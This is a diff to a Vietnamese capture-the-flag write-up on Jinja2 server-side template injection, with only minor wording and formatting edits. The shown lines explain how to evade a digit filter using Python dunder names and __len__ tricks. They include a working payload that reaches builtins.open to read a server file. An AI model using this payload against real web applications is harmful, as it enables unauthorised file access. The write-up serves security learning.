@@ -45,7 +45,7 @@ Không thể tạo payload trực tiếp, ta sẽ đi đường vòng bằng cá
 * `().__doc__[7]` sẽ trả về kí tự thứ 5 của string trên: `n`
 * `().__str__.__name__` sẽ trả về `__str__`
 
-Vì tác giả đã filter số nên ta có thể sử dụng hàm `[..].__len__()` để trả về số phần tử của 1 mảng. Ví dụ:
+Vì tác giả đã filter số nên ta sử dụng hàm `[..].__len__()` để trả về số phần tử của 1 mảng. Ví dụ:
 
 * `[].__len__()` sẽ trả về số phần tử của mảng rỗng là: `0`
 * `[[],[],[],[]].__len__()` sẽ trả về: `4`
@@ -65,7 +65,7 @@ Ta tìm được file tên là **flag** trong thư mục
 
 Tiếp theo để mở file đó, ta sẽ dùng [read file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file) để đọc file **flag**. Ta được payload như sau:
 
-`{{get_flashed_messages.__globals__.__builtins__.open(().__format__.__name__[[[],[]].__len__()]+().__le__.__name__[[[],[]].__len__()]+().__add__.__name__[[[],[]].__len__()]+().__ge__.__name__[[[],[]].__len__()]).read()}}`
+* `{{get_flashed_messages.__globals__.__builtins__.open(().__format__.__name__[[[],[]].__len__()]+().__le__.__name__[[[],[]].__len__()]+().__add__.__name__[[[],[]].__len__()]+().__ge__.__name__[[[],[]].__len__()]).read()}}`
 
 Kết quả: 
 
